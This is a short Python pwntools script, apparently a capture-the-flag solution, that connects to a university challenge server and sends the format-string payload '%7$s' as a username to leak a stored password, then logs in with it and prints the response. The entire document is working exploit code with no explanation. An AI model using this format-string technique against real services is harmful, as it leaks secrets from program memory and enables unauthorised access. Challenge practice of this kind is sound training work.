from pwn import *

r = remote("cyberchallenge.disi.unitn.it", 9006)

r.sendlineafter(
    b"username: ",
    b"%7$s"
)

password = r.recvline().strip().split(b" ")[-1]

log.info(f"Password: {password.decode()}")

r.sendlineafter(
    b"Password: ",
    password
)

print(r.recvall().decode(errors="ignore"))